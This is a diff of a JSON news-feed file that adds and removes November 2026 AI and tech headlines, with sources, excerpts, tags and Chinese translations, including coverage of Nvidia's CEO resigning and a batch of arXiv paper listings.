+      "excerpt": "11月12日晚间，英伟达发布声明称，黄仁勋已辞去总裁、首席执行官及董事会成员职务，即刻生效。公司现任执行副总裁兼首席财务官科莱特·克雷斯（Colette Kress）已同意担任临时CEO。在正式继任者确定之前，克雷斯将继续履行其执行副总裁兼首席财务官的职责。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": [
+        "release"
+      ]
+    },
+    {
+      "id": "c1729d2c3fe61e95",
+      "title": "Have we finally found a valid use case for AI? Meet Pino the autonomous virtual kiwi | First Dog on the Moon",
+      "url": "https://theguardian.com/commentisfree/picture/2026/nov/13/have-we-finally-found-a-valid-use-case-for-ai-meet-pino-the-autonomous-virtual-kiwi",
+      "source_id": "guardian",
+      "source_name": "The Guardian",
+      "source_home": "https://www.theguardian.com/technology/artificialintelligenceai",
+      "published": "2026-11-13T13:35:13+08:00",
+      "excerpt": "Pino noodles about making his own AI decisions. He has decided independently that he is into trains and cats. Aren’t we all Sign up here to get an email whenever First Dog cartoons are published Get all your needs met",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "agent"
+      ],
+      "types": [],
+      "title_zh": "我们终于找到了人工智能的有效用例吗？来认识一下皮诺吧，这个自主虚拟猕猴桃 |第一只登上月球的狗",
+      "excerpt_zh": "皮诺（Pino）讲述了自己做出的人工智能决策。他独立地决定他喜欢火车和猫。我们不是都在这里注册，以便在第一只狗卡通出版时收到电子邮件满足您的所有需求"
+    },
+    {
+      "id": "45f6772b4e696185",
+      "title": "硅谷科技领袖批评英伟达急让CEO去职：不排除延揽黄仁勋、期望王者归来",
+      "url": "https://cnbeta.com.tw/articles/tech/1586174.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:34:25+08:00",
+      "excerpt": "英伟达首席执行官去职在硅谷引起轩然大波，众多创投家和企业创始人纷纷批评这家芯片制造商的决定，并担忧该决定对整个产业的深远影响。“黑暗、黑暗的一天，”Andreessen Horowitz普通合伙人Martin Casado在X发文说。“对美国和西方世界来说，这是个烂决定。” 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": []
+    },
+    {
+      "id": "c8bed3916cc75464",
+      "title": "颓然自责与愧对家人 黄仁勋辞任英伟达CEO前的最后时光",
+      "url": "https://cnbeta.com.tw/articles/tech/1586172.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:34:04+08:00",
+      "excerpt": "到最后的时候，黄仁勋看起来心力交瘁，昔日的传奇性高能量已被清空。此前数周，他一直否认婚外情指控，努力想要保住自己的英伟达CEO职务，但还是在周三晚上无条件屈服了。据一位知情人士透露，黄仁勋往常那种一切尽在掌控之中的风范荡然无存，他开始说出诸如“随便”和“我不在乎”这样的话。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": []
+    },
+    {
+      "id": "9432bc5f6b6871bc",
+      "title": "美民主党议员夫妇在英伟达高位减持",
+      "url": "https://cnbeta.com.tw/articles/tech/1586170.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:33:02+08:00",
+      "excerpt": "一名民主党议员在这场英伟达风波中，交易时机恰好站在了有利一侧。 追踪国会议员股票交易的平台数据显示，加州民主党众议员罗·坎纳及其配偶，在英伟达股价接近高点时减持了英伟达股票。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "chip"
+      ],
+      "types": [
+        "policy"
+      ]
+    },
+    {
+      "id": "5654b1674b1c33a6",
+      "title": "tvOS 27.2.1将为旧款Apple TV 4K加入Siri AI",
+      "url": "https://cnbeta.com.tw/articles/tech/1586168.htm",
+      "source_id": "cnbeta",
+      "source_name": "cnBeta",
+      "source_home": "https://www.cnbeta.com.tw/",
+      "published": "2026-11-13T13:32:12+08:00",
+      "excerpt": "苹果支持文件显示，Apple TV 4K第二代和第三代将通过即将推出的tvOS 27.2.1获得Siri AI功能。更新目前尚未发布，苹果也没有公布具体推送日期；更新最快可能于周五推出。 阅读全文",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
+      "types": [
+        "release",
+        "product"
+      ]
+    },
+    {
+      "id": "f03d5f2d793e341c",
+      "title": "Where is Europe’s AI boom?",
+      "url": "https://ft.com/content/7ed32b6b-1e32-4046-88b6-f026339bdef4?syn-25a6b1a6=1",
+      "source_id": "ft",
+      "source_name": "Financial Times",
+      "source_home": "https://www.ft.com/artificial-intelligence",
+      "published": "2026-11-13T13:00:17+08:00",
+      "excerpt": "Squint, and it’s showing up in the data",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [],
+      "title_zh": "欧洲的人工智能热潮在哪里？",
+      "excerpt_zh": "眯着眼睛一看，数据就显示出来了"
+    },
+    {
+      "id": "e84331da6839b33e",
+      "title": "Europe’s AI story. With Philip Lane",
+      "url": "https://ft.com/content/715c417d-b8e7-476e-bc66-95acc371987e?syn-25a6b1a6=1",
+      "source_id": "ft",
+      "source_name": "Financial Times",
+      "source_home": "https://www.ft.com/artificial-intelligence",
+      "published": "2026-11-13T13:00:00+08:00",
+      "excerpt": "How AI is already reshaping Europe's economy",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [],
+      "title_zh": "欧洲的人工智能故事。与菲利普·莱恩",
+      "excerpt_zh": "人工智能如何重塑欧洲经济"
+    },
+    {
       "id": "63e77c1007135838",
       "title": "李彦宏的考题，发给了所有CEO",
       "url": "https://tmtpost.com/8203972.html",
@@ -1178,6 +1845,21 @@
       "types": [
         "business"
       ]
+    },
+    {
+      "id": "abab2ed2699580d6",
+      "title": "国产大模型又杀出一匹黑马，引发硅谷关注！",
+      "url": "https://news.google.com/rss/articles/CBMiVEFVX3lxTE9jcWtZbzRCUXN2RHN1Q3Fkbm5Dd3Q2eXcwV1FQWjVKQXU0WkdYVlhONG5fdjkwZDBXUzF5cUd6cGYyS2NOZ1BOMGhHRHpsOUliTlpoOA?oc=5",
+      "source_id": "qbitai",
+      "source_name": "量子位",
+      "source_home": "https://www.qbitai.com",
+      "published": "2026-11-13T12:47:18+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
+      "types": []
     },
     {
       "id": "0f77776f7c503aee",
@@ -1217,6 +1899,23 @@
       "types": []
     },
     {
+      "id": "f1630c82f646363b",
+      "title": "Watchmakers wrestle with influence of AI on buyers",
+      "url": "https://ft.com/content/dd653a19-492a-41d1-b459-3a2b7d2f0e86",
+      "source_id": "ft",
+      "source_name": "Financial Times",
+      "source_home": "https://www.ft.com/artificial-intelligence",
+      "published": "2026-11-13T12:00:08+08:00",
+      "excerpt": "Brands are under pressure to rethink how they reach consumers and ensure that searches present their products accurately and create desirability",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [],
+      "title_zh": "制表商努力应对人工智能对买家的影响",
+      "excerpt_zh": "品牌面临着重新思考如何吸引消费者的压力，并确保搜索准确地展示其产品并创造需求"
+    },
+    {
       "id": "e1b68a2d7128af8b",
       "title": "黄仁勋 8 月曾痛斥英伟达新临时 CEO 克雷斯，称其为“只会报账的 CFO”“被车灯照懵的鹿”",
       "url": "https://ithome.com/1/026/626.htm",
@@ -1234,6 +1933,23 @@
       "types": [
         "business"
       ]
+    },
+    {
+      "id": "865f5eddb0b2986c",
+      "title": "独家丨腾讯 AI 李牧青离职，出任 AI 公司联席 CEO",
+      "url": "https://leiphone.com/category/industrynews/xfpQo71RiPDWJHvS.html",
+      "source_id": "leiphone",
+      "source_name": "雷峰网",
+      "source_home": "https://www.leiphone.com/",
+      "published": "2026-11-13T11:43:00+08:00",
+      "excerpt": "雷峰网独家获悉，近日，腾讯云 AI 全球业务负责人李牧青，正式出任教育 AI 科技公司启鸣达人联席 CEO。 雷峰网了解到，李牧青本科、硕士毕业于上海交通大学，曾任 UCLA 访问学者。2016 年，他加入依图科技，主导早期 AI 产业化体系的建设，亲历「AI 四小龙」从初创走向鼎盛。 2018 年，李牧青加入腾讯优图，出任首席方案架构师，负责计算机视觉技术的落地。",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [
+        "education"
+      ],
+      "types": []
     },
     {
       "id": "929393cb626ab4d7",
@@ -1301,6 +2017,68 @@
       "topics": [
         "robotics"
       ],
+      "types": []
+    },
+    {
+      "id": "6e4c442c89ec2330",
+      "title": "ID. ERA 5X上市，限时权益价9.99万元起",
+      "url": "https://leiphone.com/category/transportation/Uxxem2Ha3zzVNdv9.html",
+      "source_id": "leiphone",
+      "source_name": "雷峰网",
+      "source_home": "https://www.leiphone.com/",
+      "published": "2026-11-13T11:16:00+08:00",
+      "excerpt": "近日，上汽大众ID. ERA 5X正式上市，新车共推出Pro、Pro+、Max、Ultra四款车型。限时权益价为 9 . 99 万元— 13 . 99 万元 。作为一款面向年轻人与家庭用户的都市纯电SUV，ID. ERA 5X是大众CMP+CEA+ADAS全球首款量产车，全系标配4纳米MTK8676车规级芯片与豆包大模型2.0，并搭载行云智能辅助驾驶系统，融合中国原生智能技术与大众全球标准，兼顾智能体验与家庭出行需求。",
+      "lang": "zh",
+      "region": "cn",
+      "models": [
+        "doubao"
+      ],
+      "topics": [
+        "agent",
+        "chip"
+      ],
+      "types": [
+        "release",
+        "business",
+        "review"
+      ]
+    },
+    {
+      "id": "1fe9916aaf7114fb",
+      "title": "Anthropic carelessly killed a Claude Code feature users built on, no warning",
+      "url": "https://github.com/anthropics/claude-code/issues/109446",
+      "source_id": "hackernews",
+      "source_name": "Hacker News",
+      "source_home": "https://news.ycombinator.com/",
+      "published": "2026-11-13T11:13:43+08:00",
+      "excerpt": "Article URL: https://github.com/anthropics/claude-code/issues/109446 Comments URL: https://news.ycombinator.com/item?id=50477704 Points: 20 # Comments: 5",
+      "lang": "en",
+      "region": "intl",
+      "models": [
+        "claude"
+      ],
+      "topics": [
+        "coding"
+      ],
+      "types": [
+        "product"
+      ],
+      "title_zh": "Anthropic 不小心杀死了用户构建的 Claude Code 功能，没有任何警告",
+      "excerpt_zh": "文章网址：https://github.com/anthropics/claude-code/issues/109446 评论网址：https://news.ycombinator.com/item?id=50477704 积分：20 # 评论：5"
+    },
+    {
+      "id": "7111df11717538ad",
+      "title": "专家学者共探人工智能时代课堂变革路径",
+      "url": "https://news.google.com/rss/articles/CBMiakFVX3lxTFBNN1MxdDItaWloWmNYNjdRM2I0bTlmYno5MnEtZ1FRMWRxZlFoTTFrNmFvcEdUUnR3NE93SHFZSlh3UDRGem43TXUxOUxwQUxZX2p2QmZXbXAtWFN1WHA0dVQ4WmNJTWFhb1E?oc=5",
+      "source_id": "people",
+      "source_name": "人民网",
+      "source_home": "http://www.people.com.cn",
+      "published": "2026-11-13T11:11:00+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
       "types": []
     },
     {
@@ -1432,6 +2210,21 @@
       "types": [
         "business"
       ]
+    },
+    {
+      "id": "bd8daecbd37a491e",
+      "title": "燧原科技坐上“四小龙”头把交椅，腾讯斩获400亿浮盈",
+      "url": "https://news.google.com/rss/articles/CBMiT0FVX3lxTE9PMHdtdFJNd3BoRW5TbklVazBwb0JybUxKYVVhYk82WUhMejctcy04bG1pREpFNEdNTDFHb2lsNmhGV2V4YnZhVGdlLWV0b0k?oc=5",
+      "source_id": "36kr",
+      "source_name": "36氪",
+      "source_home": "https://www.36kr.com",
+      "published": "2026-11-13T10:43:36+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
+      "types": []
     },
     {
       "id": "1fdc7319b3a05f47",
@@ -1596,25 +2389,6 @@
       ]
     },
     {
-      "id": "6c792934d353d3cd",
-      "title": "黄仁勋辞职后，英伟达总部外出现鲜花和蜡烛",
-      "url": "https://ithome.com/1/026/492.htm",
-      "source_id": "ithome",
-      "source_name": "IT之家",
-      "source_home": "https://www.ithome.com/",
-      "published": "2026-11-13T09:35:27+08:00",
-      "excerpt": "IT之家 11 月 13 日消息，科技媒体 Business Insider 昨日（11 月 12 日）发布博文，报道称在美国加州圣克拉拉的英伟达总部外， 有人于公司标志前摆放多束鲜花，并放置了一支装在玻璃罐中的白色蜡烛，被外界视为致敬黄仁勋这位 AI 时代标志性人物。 现场画面显示，一名路人将玻璃罐装蜡烛放在“NVIDIA”标志前；鲜花则整齐靠在标志下方。",
-      "lang": "zh",
-      "region": "cn",
-      "models": [],
-      "topics": [
-        "chip"
-      ],
-      "types": [
-        "release"
-      ]
-    },
-    {
       "id": "fa9532cd955d7a3c",
       "title": "消息称英伟达前 CEO 黄仁勋同意在感恩节前赴国会作证，具体日期仍在协商",
       "url": "https://ithome.com/1/026/489.htm",
@@ -1736,25 +2510,6 @@
       ]
     },
     {
-      "id": "c1ba94011bd64caa",
-      "title": "Gemini 4 Hydrogen来了，所有人都能用",
-      "url": "https://tmtpost.com/8203746.html",
-      "source_id": "tmtpost",
-      "source_name": "钛媒体",
-      "source_home": "https://www.tmtpost.com/",
-      "published": "2026-11-13T09:17:46+08:00",
-      "excerpt": "终于不光卷跑分了。",
-      "lang": "zh",
-      "region": "cn",
-      "models": [
-        "gemini"
-      ],
-      "topics": [],
-      "types": [
-        "review"
-      ]
-    },
-    {
       "id": "048c8bda15b1ce78",
       "title": "中芯国际赵海军：第三季度平均晶圆单价环比提升 1.8%",
       "url": "https://ithome.com/1/026/487.htm",
@@ -1806,6 +2561,21 @@
       "types": []
     },
     {
+      "id": "007dc4c0b8073c30",
+      "title": "Edge AI Daily 早报（11月13日）",
+      "url": "https://news.google.com/rss/articles/CBMiTEFVX3lxTE5DRXVBYnplcUYyNWxuNXRPak9HTFlwR2drY3h4WlJwTC01YW96QXRBMW5Ldk50Rmd4ZUFYVzV3UXRYSEZScnJDekN4UFI?oc=5",
+      "source_id": "tmtpost",
+      "source_name": "钛媒体",
+      "source_home": "https://www.tmtpost.com",
+      "published": "2026-11-13T08:58:00+08:00",
+      "excerpt": "",
+      "lang": "zh",
+      "region": "cn",
+      "models": [],
+      "topics": [],
+      "types": []
+    },
+    {
       "id": "dadb693494546157",
       "title": "派早报：英伟达 CEO 黄仁勋宣布辞职等",
       "url": "https://sspai.com/post/118966",
@@ -1832,14 +2602,13 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-13T08:38:41+08:00",
-      "excerpt": "Article URL: https://www.techspot.com/news/114532-chicago-schools-tell-google-they-can-live-without.html Comments URL: https://news.ycombinator.com/item?id=50476586 Points: 67 # Comments: 21",
+      "excerpt": "Article URL: https://www.techspot.com/news/114532-chicago-schools-tell-google-they-can-live-without.html Comments URL: https://news.ycombinator.com/item?id=50476586 Points: 71 # Comments: 22",
       "lang": "en",
       "region": "intl",
       "models": [],
       "topics": [],
       "types": [],
-      "title_zh": "芝加哥学校对谷歌——我们宁愿失去搜索，也不愿被迫接受人工智能",
-      "excerpt_zh": "文章网址：https://www.techspot.com/news/114532-chicago-schools-tell-google-they-can-live-without.html 评论网址：https://news.ycombinator.com/item?id=50476586 积分：67 # 评论：21"
+      "title_zh": "芝加哥学校对谷歌——我们宁愿失去搜索，也不愿被迫接受人工智能"
     },
     {
       "id": "209c4dfaee7c0f04",
@@ -1883,21 +2652,6 @@
       "excerpt_zh": "这位高管的离职标志着他三十年任期的惊人结束，这位高管将芯片公司打造成人工智能繁荣的引擎"
     },
     {
-      "id": "4c0ae95ec979b7b5",
-      "title": "华泰证券：AI产业内部或沿回报验证分化",
-      "url": "https://news.google.com/rss/articles/CBMiWEFVX3lxTE1iZm5NbTdLMjBBbTBiQmMyWkVxelZRZko1R3VlLWJkaURqWmZzUGI4dWNBa1loNkRVM3pPbkR6WER5SEg5OUxUY1ZLX1RlVzFFU01jVnRsSFI?oc=5",
-      "source_id": "36kr",
-      "source_name": "36氪",
-      "source_home": "https://www.36kr.com",
-      "published": "2026-11-13T08:02:38+08:00",
-      "excerpt": "",
-      "lang": "zh",
-      "region": "cn",
-      "models": [],
-      "topics": [],
-      "types": []
-    },
-    {
       "id": "9a08ae200d1d3d29",
       "title": "早报｜黄仁勋仍为英伟达最大个人股东/豆包工作接入多款第三方模型/微信「看一看」测试短剧入口",
       "url": "https://ifanr.com/1689292",
@@ -1920,21 +2674,6 @@
       "types": [
         "business"
       ]
-    },
-    {
-      "id": "094259787a994f44",
-      "title": "AI应用场景开始分层，半导体产业链上下游寻找新突破口",
-      "url": "https://news.google.com/rss/articles/CBMiWEFVX3lxTE5VWVVjb2JiWmJaNUZDY1VOV1BRbnk4VUJNZ0tLeHpCMVBnam5ZTVFPQmctZkFzZjFYOFBsMjVoNk9KM2w0aThYaWJUQzRwNkR0UzV2VkcxUGs?oc=5",
-      "source_id": "36kr",
-      "source_name": "36氪",
-      "source_home": "https://www.36kr.com",
-      "published": "2026-11-13T07:57:47+08:00",
-      "excerpt": "",
-      "lang": "zh",
-      "region": "cn",
-      "models": [],
-      "topics": [],
-      "types": []
     },
     {
       "id": "fa03c80c7bed82ca",
@@ -2156,14 +2895,13 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-13T07:08:31+08:00",
-      "excerpt": "Article URL: https://www.economist.com/leaders/2026/11/12/why-you-should-expect-an-ai-crash Comments URL: https://news.ycombinator.com/item?id=50475735 Points: 89 # Comments: 76",
+      "excerpt": "Article URL: https://www.economist.com/leaders/2026/11/12/why-you-should-expect-an-ai-crash Comments URL: https://news.ycombinator.com/item?id=50475735 Points: 90 # Comments: 78",
       "lang": "en",
       "region": "intl",
       "models": [],
       "topics": [],
       "types": [],
-      "title_zh": "为什么你应该预料到人工智能会崩溃",
-      "excerpt_zh": "文章网址：https://www.economist.com/leaders/2026/11/12/why-you-should-expect-an-ai-crash 评论网址：https://news.ycombinator.com/item?id=50475735 积分：89 # 评论：76"
+      "title_zh": "为什么你应该预料到人工智能会崩溃"
     },
     {
       "id": "f980cc1f1e212524",
@@ -2173,7 +2911,7 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-13T07:06:17+08:00",
-      "excerpt": "Article URL: https://edge0.ai/blog/introducing-edge0-145b-frontier-ai-capabilities-on-your-own-computer Comments URL: https://news.ycombinator.com/item?id=50475713 Points: 145 # Comments: 37",
+      "excerpt": "Article URL: https://edge0.ai/blog/introducing-edge0-145b-frontier-ai-capabilities-on-your-own-computer Comments URL: https://news.ycombinator.com/item?id=50475713 Points: 191 # Comments: 50",
       "lang": "en",
       "region": "intl",
       "models": [],
@@ -2181,8 +2919,7 @@
       "types": [
         "release"
       ],
-      "title_zh": "Edge0-145B：您自己的计算机上的前沿人工智能功能",
-      "excerpt_zh": "文章网址：https://edge0.ai/blog/introducing-edge0-145b-frontier-ai-capability-on-your-own-computer 评论网址：https://news.ycombinator.com/item?id=50475713 积分：145 # 评论：37"
+      "title_zh": "Edge0-145B：您自己的计算机上的前沿人工智能功能"
     },
     {
       "id": "9f0b516152c12ca0",
@@ -2453,14 +3190,13 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-13T05:56:11+08:00",
-      "excerpt": "Article URL: https://unemploymentlabs.com/checkpoint-forensics Comments URL: https://news.ycombinator.com/item?id=50474883 Points: 225 # Comments: 61",
+      "excerpt": "Article URL: https://unemploymentlabs.com/checkpoint-forensics Comments URL: https://news.ycombinator.com/item?id=50474883 Points: 260 # Comments: 75",
       "lang": "en",
       "region": "intl",
       "models": [],
       "topics": [],
       "types": [],
-      "title_zh": "中国前沿人工智能模型带有出口管制GPU的指纹",
-      "excerpt_zh": "文章网址：https://unemploymentlabs.com/checkpoint-forensics 评论网址：https://news.ycombinator.com/item?id=50474883 积分：225 # 评论：61"
+      "title_zh": "中国前沿人工智能模型带有出口管制GPU的指纹"
     },
     {
       "id": "8af226d2b9f4a115",
@@ -2593,7 +3329,7 @@
       "source_name": "Hacker News",
       "source_home": "https://news.ycombinator.com/",
       "published": "2026-11-13T05:09:49+08:00",
-      "excerpt": "Article URL: https://synthanatomy.com/2026/11/ai-is-turning-apples-app-review-process-into-a-nightmare-for-developers.html Comments URL: https://news.ycombinator.com/item?id=50474311 Points: 137 # Comments: 128",
+      "excerpt": "Article URL: https://synthanatomy.com/2026/11/ai-is-turning-apples-app-review-process-into-a-nightmare-for-developers.html Comments URL: https://news.ycombinator.com/item?id=50474311 Points: 152 # Comments: 147",
       "lang": "en",
       "region": "intl",
       "models": [],
@@ -2601,8 +3337,7 @@
       "types": [
         "review"
       ],
-      "title_zh": "人工智能正在将苹果的应用程序审核流程变成合成开发人员的噩梦",
-      "excerpt_zh": "文章网址：https://synthanatomy.com/2026/11/ai-is-turning-apples-app-review-process-into-a-nightmare-for-developers.html 评论网址：https://news.ycombinator.com/item?id=50474311 积分：137 # 评论：128"
+      "title_zh": "人工智能正在将苹果的应用程序审核流程变成合成开发人员的噩梦"
     },
     {
       "id": "201fd1b4ac76177f",
@@ -3165,6 +3900,174 @@
       "excerpt_zh": "本周的《恐怖谷》节目中，该团队将揭秘英伟达首席执行官与一名涉嫌中国间谍的恋情，以及这对人工智能行业意味着什么。"
     },
     {
+      "id": "4f73e28532cca567",
+      "title": "Unbundling Multimodal Vision Encoding",
+      "url": "https://arxiv.org/abs/2611.17334v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:59:54+08:00",
+      "excerpt": "How multimodal language models should encode visual input remains up for debate. Most models use a pretrained vision encoder",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "multimodal"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "分拆多模态视觉编码",
+      "excerpt_zh": "多模态语言模型应如何编码视觉输入仍有争议。大多数模型使用预训练的视觉编码器"
+    },
+    {
+      "id": "53a9ebad52ebe60f",
+      "title": "ArchSpace: Recording, Reviewing, and Referencing LLM Architecture Research",
+      "url": "https://arxiv.org/abs/2611.17332v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:59:52+08:00",
+      "excerpt": "Model architecture shapes the scaling behavior, training efficiency, and inference cost of LLMs, making it a central focus of both industry and academia",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "text"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "ArchSpace：记录、回顾和引用 LLM 架构研究",
+      "excerpt_zh": "模型架构决定了法学硕士的扩展行为、训练效率和推理成本，使其成为业界和学术界的焦点"
+    },
+    {
+      "id": "e5dc97b072d734e3",
+      "title": "Internalizing Investment Mandates: A Neurosymbolic RL Approach to Portfolio Allocation",
+      "url": "https://arxiv.org/abs/2611.17329v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:59:37+08:00",
+      "excerpt": "Institutional portfolios operate under investment policy statements that specify asset allocation constraints, often conditioned on market regime information",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research",
+        "business",
+        "policy"
+      ],
+      "title_zh": "投资指令内部化：投资组合配置的神经符号强化学习方法",
+      "excerpt_zh": "机构投资组合根据指定资产配置限制的投资政策声明进行运作，通常以市场制度信息为条件"
+    },
+    {
+      "id": "5551097f06d87d76",
+      "title": "AgentSSL: Can MLE Agents Leverage Unlabeled Data?",
+      "url": "https://arxiv.org/abs/2611.17323v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:59:06+08:00",
+      "excerpt": "Applying machine learning systems to new domains introduces bottlenecks in both labeled data acquisition and manual pipeline engineering",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "agent"
+      ],
+      "types": [
+        "release",
+        "research",
+        "business"
+      ],
+      "title_zh": "AgentSSL：MLE 代理可以利用未标记的数据吗？",
+      "excerpt_zh": "将机器学习系统应用于新领域会在标记数据采集和手动管道工程中引入瓶颈"
+    },
+    {
+      "id": "03e1ce70f1125e7d",
+      "title": "Learning When Diffusion Language Models Should Regenerate",
+      "url": "https://arxiv.org/abs/2611.17320v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:58:50+08:00",
+      "excerpt": "Remasking allows diffusion language models to revisit generated text, but effective correction requires knowing when and what to revise. Our diagnosis on Sudoku reveals two gaps",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "学习扩散语言模型何时应该再生",
+      "excerpt_zh": "重新掩码允许扩散语言模型重新访问生成的文本，但有效的纠正需要知道何时以及修改什么。我们对数独的诊断揭示了两个差距"
+    },
+    {
+      "id": "0ca25edadd1d7b98",
+      "title": "CoReMem: Cost-Internalizing Memory for Successive Coding Tasks with Prospective Valuation",
+      "url": "https://arxiv.org/abs/2611.17316v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:58:22+08:00",
+      "excerpt": "Coding agents tackle successive tasks on an evolving repository, carrying forward edits and writing memory before the next task is known",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "coding",
+        "agent"
+      ],
+      "types": [
+        "research",
+        "business"
+      ],
+      "title_zh": "CoReMem：具有前瞻性评估的连续编码任务的成本内部化内存",
+      "excerpt_zh": "编码代理在不断发展的存储库中处理连续的任务，在知道下一个任务之前进行编辑并写入内存"
+    },
+    {
+      "id": "1e67e9bdd27cf09d",
+      "title": "Linking Rapid Learning to Compositional Structure in Neural Networks: Evidence from Additive Analogies in Meta-Learned Parameter Spaces",
+      "url": "https://arxiv.org/abs/2611.17314v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:57:49+08:00",
+      "excerpt": "Humans can learn rapidly from limited experience, while neural networks typically require extensive training. In this work, we investigate what properties of a neural network can enable it to learn rapidly",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "将快速学习与神经网络的组成结构联系起来：来自元学习参数空间中的加性类比的证据",
+      "excerpt_zh": "人类可以从有限的经验中快速学习，而神经网络通常需要大量的训练。在这项工作中，我们研究神经网络的哪些属性可以使其快速学习"
+    },
+    {
+      "id": "2db4f217aa28f05a",
+      "title": "Sketching Language Models for Context Attribution",
+      "url": "https://arxiv.org/abs/2611.17313v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:57:48+08:00",
+      "excerpt": "Context attribution asks how removing parts of a prompt changes a language model's output. We study leave-one-out (LOO) attribution for a prompt of $n$ tokens and a fixed measurement function",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "text"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "绘制上下文归因的语言模型",
+      "excerpt_zh": "上下文归因询问删除部分提示如何改变语言模型的输出。我们研究了 $n$ 代币提示和固定测量函数的留一法 (LOO) 归因"
+    },
+    {
       "id": "81bcb5c122b27570",
       "title": "Google faces calls for AI moratoriums in schools after Gemini pilot backlash",
       "url": "https://arstechnica.com/tech-policy/2026/11/families-fight-to-keep-googles-disturbing-ai-off-school-issued-chromebooks",
@@ -3186,6 +4089,168 @@
       "excerpt_zh": "青少年诉讼称双子座为“自杀教练”后，家人与谷歌对峙。"
     },
     {
+      "id": "1a051245aa5e4a68",
+      "title": "Classical Energies Learn to Reason 1,000x Faster than Looped Models",
+      "url": "https://arxiv.org/abs/2611.17309v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:56:56+08:00",
+      "excerpt": "Looped models have emerged as a prominent paradigm for reasoning, with successes on simple reasoning puzzles such as Sudoku-Extreme and Maze-Unique",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [
+        "reasoning"
+      ],
+      "types": [
+        "research"
+      ],
+      "title_zh": "经典能量学习推理的速度比循环模型快 1,000 倍",
+      "excerpt_zh": "循环模型已成为推理的重要范式，在简单的推理难题（例如数独极限和迷宫独特）上取得了成功"
+    },
+    {
+      "id": "3b9ad924f3c2ec5f",
+      "title": "Quantifying structural stability of transparent models for general insurance pricing",
+      "url": "https://arxiv.org/abs/2611.17308v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:56:54+08:00",
+      "excerpt": "The short duration of general insurance contracts leads to rapid distributional shifts in the data, warranting regular model updates",
+      "lang": "en",
+      "region": "intl",
+      "models": [],
+      "topics": [],
+      "types": [
+        "research"
+      ],
+      "title_zh": "量化一般保险定价透明模型的结构稳定性",
+      "excerpt_zh": "一般保险合同的期限短导致数据分布快速变化，需要定期更新模型"
+    },
+    {
+      "id": "cca605336e671312",
+      "title": "Towards a Theory of Learnability via Debate",
+      "url": "https://arxiv.org/abs/2611.17303v1",
+      "source_id": "arxiv",
+      "source_name": "arXiv",
+      "source_home": "https://arxiv.org",
+      "published": "2026-11-13T02:55:58+08:00",
